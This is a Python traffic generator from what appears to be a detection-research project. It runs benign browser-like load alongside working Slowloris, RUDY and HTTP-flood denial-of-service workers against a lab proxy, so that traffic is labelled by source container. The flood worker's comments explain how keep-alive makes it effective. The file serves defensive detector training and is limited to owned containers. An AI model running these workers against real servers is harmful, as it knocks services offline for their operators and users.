#!/usr/bin/env python3
"""
generate.py — produce labelled traffic, with ground truth from the generator.

WHY WE GENERATE INSTEAD OF ONLY USING CIC-IDS2017
--------------------------------------------------
The public dataset cannot support this project, for three reasons that are
documented rather than guessed:

  1. The only two DoS attacks that actually worked in CIC-IDS2017 were
     Slowloris and SlowHTTPtest — BOTH slow. There is no working flood in it.
     Hulk was mis-implemented (it needs HTTP keep-alive; all recorded Hulk
     traffic used `Connection: close`), so it behaves like browsing.
     Result: training only on CIC-IDS2017 means the flood branch of the
     mechanism switch has nothing to learn from.

  2. Its 85 CICFlowMeter columns do not map onto our FlowRecord. Every join
     is a hand-written translation, and the features that matter most for slow
     attacks (is the header complete? has the declared body arrived?) are not
     among them.

  3. Its labels come from the attacker's intent, not from measured behaviour.

Generating our own fixes all three at once:
  * every attack class we need, including a working flood
  * features come from our own sensor, so there is no column translation
  * the label is the SOURCE CONTAINER, so labelling is exact and free

CIC-IDS2017 is still used, for the dataset audit and as a secondary check.

GROUND TRUTH BY CONTAINER
-------------------------
Each generator runs in its own container with its own IP. The capture is on
the proxy's interface, so we can label by source IP:

    legit-loadgen  -> benign
    slow-gen       -> slowloris / rudy
    flood-gen      -> flood

That label is objective. No heuristics, no manual annotation.

AUTHORISATION: run only against containers you control, with the signed
authorisation sheet in the repo. Never against anything you do not own.
"""
from __future__ import annotations

import argparse
import asyncio
import random
import time

# Targets are resolved by container name on the lab network.
LAB_HOST = "proxy"
LAB_PORT = 80


# ---------------------------------------------------------------------------
# BENIGN — must look realistic, including the awkward cases
# ---------------------------------------------------------------------------
async def benign_worker(agent: int, duration: int, think_lo: float,
                        think_hi: float, slow_fraction: float = 0.15):
    """A realistic browser session.

    slow_fraction deliberately produces SLOW BUT FINITE requests: a user on a
    bad connection who takes 8 seconds to upload a 2 MB form. This is the hard
    negative. Without it, the stall detector will flag every large upload and
    the false-positive rate in the report will be fiction.
    """
    reader, writer = await asyncio.open_connection(LAB_HOST, LAB_PORT)
    end = time.time() + duration
    uid = f"u{agent}"

    while time.time() < end:
        slow = random.random() < slow_fraction
        body_len = random.randint(200_000, 2_000_000) if slow else random.randint(0, 4000)

        head = (f"POST /api/form/{uid} HTTP/1.1\r\n"
                f"Host: api\r\n"
                f"User-Agent: Mozilla/5.0 ({uid})\r\n"
                f"Content-Length: {body_len}\r\n"
                f"Content-Type: multipart/form-data\r\n\r\n")

        if slow:
            # the nasty case: a genuinely slow client that DOES finish
            writer.write(head.encode())
            await writer.drain()
            chunk = b"x" * 8192
            sent = 0
            while sent < body_len and time.time() < end:
                writer.write(chunk)
                await writer.drain()
                sent += len(chunk)
                await asyncio.sleep(random.uniform(0.3, 0.9))
        else:
            body = b"x" * body_len if body_len else b""
            writer.write(head.encode() + body)
            await writer.drain()

        # read the response so keep-alive stays alive
        try:
            await asyncio.wait_for(reader.read(4096), timeout=10)
        except asyncio.TimeoutError:
            pass

        await asyncio.sleep(random.uniform(think_lo, think_hi))

    writer.close()


# ---------------------------------------------------------------------------
# SLOWLORIS — header never terminates, connection never closes
# ---------------------------------------------------------------------------
async def slowloris_worker(conn_id: int, duration: int,
                           byte_interval: float = 0.10):
    """Open a connection and drip the request header forever.

    byte_interval 0.10 means 10 bytes/sec: the header is ~100 bytes so it takes
    ~10 seconds and never finishes within the run.
    """
    reader, writer = await asyncio.open_connection(LAB_HOST, LAB_PORT)
    head = (f"GET /api/search?q={'y' * 70}&u={conn_id} HTTP/1.1\r\n"
            f"Host: api\r\nUser-Agent: curl/7.81.0\r\n\r\n")

    end = time.time() + duration
    for i in range(0, len(head), 2):
        if time.time() > end:
            break
        writer.write(head[i:i + 2].encode())
        await writer.drain()
        await asyncio.sleep(byte_interval)

    # hold it open. This is the exhaustion: N sockets, zero requests served.
    while time.time() < end:
        await asyncio.sleep(1)
    writer.close()


# ---------------------------------------------------------------------------
# RUDY — valid complete header, enormous Content-Length, body trickled
# ---------------------------------------------------------------------------
async def rudy_worker(conn_id: int, duration: int,
                      declared: int = 5_000_000, chunk: int = 10,
                      interval: float = 0.5):
    reader, writer = await asyncio.open_connection(LAB_HOST, LAB_PORT)
    head = (f"POST /api/upload/{conn_id} HTTP/1.1\r\n"
            f"Host: api\r\nContent-Length: {declared}\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n")
    writer.write(head.encode())
    await writer.drain()

    end = time.time() + duration
    while time.time() < end:
        writer.write(b"x" * chunk)
        await writer.drain()
        await asyncio.sleep(interval)
    writer.close()


# ---------------------------------------------------------------------------
# FLOOD — high rate, keep-alive, every request complete
# ---------------------------------------------------------------------------
async def flood_worker(conn_id: int, duration: int, req_per_conn: int = 200):
    """A working HTTP flood.

    Keep-alive is used deliberately. With `Connection: close` each request costs
    a fresh TCP handshake, which throttles the attack to the handshake rate —
    that is the bug that made Hulk ineffective in CIC-IDS2017. Reusing the
    connection is what lets one connection sustain thousands of requests/sec.
    """
    reader, writer = await asyncio.open_connection(LAB_HOST, LAB_PORT)
    end = time.time() + duration

    while time.time() < end:
        for _ in range(req_per_conn):
            writer.write(b"GET /api/items HTTP/1.1\r\nHost: api\r\n"
                         b"Connection: keep-alive\r\n"
                         b"User-Agent: Mozilla/5.0\r\n\r\n")
        await writer.drain()
        try:
            await asyncio.wait_for(reader.read(65536), timeout=2)
        except asyncio.TimeoutError:
            pass
    writer.close()


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
async def run_mix(duration: int, n_benign: int, n_slow: int, n_rudy: int,
                  n_flood: int, label: str):
    """Run benign load and all three attacks concurrently, as in a real incident."""
    tasks = []
    for i in range(n_benign):
        tasks.append(benign_worker(i, duration, 0.2, 2.0))
    for i in range(n_slow):
        tasks.append(slowloris_worker(i, duration))
    for i in range(n_rudy):
        tasks.append(rudy_worker(i, duration))
    for i in range(n_flood):
        tasks.append(flood_worker(i, duration))

    print(f"[{label}] {n_benign} benign + {n_slow} slowloris + "
          f"{n_rudy} rudy + {n_flood} flood, for {duration}s")
    await asyncio.gather(*tasks, return_exceptions=True)


async def run_benign_only(duration: int, n_benign: int, label: str):
    """Benign-only run. THIS is the run that produces the false-positive rate.

    Measure every trigger's FPR here. Tuning thresholds on traffic that
    contains attacks guarantees a flattering and meaningless number.
    """
    tasks = [benign_worker(i, duration, 0.2, 2.0) for i in range(n_benign)]
    print(f"[{label}] benign only: {n_benign} agents, {duration}s "
          f"(this run gives the FPR)")
    await asyncio.gather(*tasks, return_exceptions=True)


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Generate labelled L7 attack traffic against the lab proxy")
    ap.add_argument("--mode", required=True,
                    choices=["benign", "mix", "slow", "rudy", "flood"])
    ap.add_argument("--duration", type=int, default=120)
    ap.add_argument("--benign", type=int, default=50)
    ap.add_argument("--slow", type=int, default=200)
    ap.add_argument("--rudy", type=int, default=100)
    ap.add_argument("--flood", type=int, default=20)
    ap.add_argument("--label", default="run")
    args = ap.parse_args()

    if args.mode == "benign":
        asyncio.run(run_benign_only(args.duration, args.benign, args.label))
    elif args.mode == "slow":
        asyncio.run(run_mix(args.duration, args.benign, args.slow, 0, 0,
                            args.label))
    elif args.mode == "rudy":
        asyncio.run(run_mix(args.duration, args.benign, 0, args.rudy, 0,
                            args.label))
    elif args.mode == "flood":
        asyncio.run(run_mix(args.duration, args.benign, 0, 0, args.flood,
                            args.label))
    else:
        asyncio.run(run_mix(args.duration, args.benign, args.slow,
                            args.rudy, args.flood, args.label))


if __name__ == "__main__":
    main()
